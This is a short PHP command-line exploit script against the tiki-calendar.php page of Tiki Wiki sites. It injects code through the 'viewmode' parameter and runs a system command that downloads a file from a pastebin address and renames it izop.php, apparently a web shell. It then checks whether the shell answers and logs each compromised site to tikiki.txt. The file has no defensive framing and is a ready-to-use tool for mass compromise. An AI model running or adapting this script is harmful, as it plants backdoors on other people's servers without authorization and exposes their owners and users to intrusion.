<?php
error_reporting(0);

$site= $argv[1];


	        $lolz='/tiki-calendar.php?viewmode=%27;print(system(%27wget%20https://pastebin.com/raw/zFAdyqJ3;mv%2061T79wUd%20izop.php%27));$a=%27';
                $sp = "/izop.php";
		$url = $site.$lolz;
		$ch = curl_init();
		curl_setopt($ch,CURLOPT_URL,$url);
		curl_setopt($ch,CURLOPT_POST,1);
		curl_setopt($ch,CURLOPT_POSTFIELDS,array());
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,3);
	        curl_setopt($ch,CURLOPT_TIMEOUT,3);
		$data = curl_exec($ch);
		$lol = $site.$sp;
		$cnlol = @file_get_contents($lol);
			if(preg_match('#xSecurity#i',$cnlol)){
			echo "\n\t[#] Success :)\n\t[#]$lol\n\t----------------------------------------------------------------\n\n";
			            $save = fopen ('tikiki.txt','a+');
                                    fwrite ($save,$lol."\n");
			
			}else{
				echo "\n\t\n\n";}

?>
